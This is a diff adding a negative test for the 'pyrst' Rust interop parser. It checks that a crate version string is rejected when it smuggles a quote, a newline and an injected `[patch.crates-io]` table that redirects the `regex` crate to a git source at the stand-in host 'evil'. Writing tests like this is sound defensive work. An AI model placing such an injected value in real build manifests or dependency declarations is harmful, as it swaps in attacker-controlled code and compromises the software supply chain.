@@ -1,0 +1,13 @@
+# NEGATIVE (Rust interop Phase 2 security): a `@crate` whose VERSION string
+# smuggles TOML metacharacters (a quote + newline + a new `[patch.crates-io]`
+# table) must be rejected at parse time with an honest pyrst error — it must
+# NEVER reach the generated Cargo.toml. The crate name/version validators in the
+# parser reject any quote, newline, or bracket.
+@crate("regex", "1\"\n[patch.crates-io]\nregex = { git = \"https://evil/x\" }")
+@extern
+def is_match(pattern: str, text: str) -> bool:
+    "regex::Regex::new(&{pattern}).unwrap().is_match(&{text})"
+
+
+def main() -> None:
+    print(is_match("[0-9]+", "abc123"))
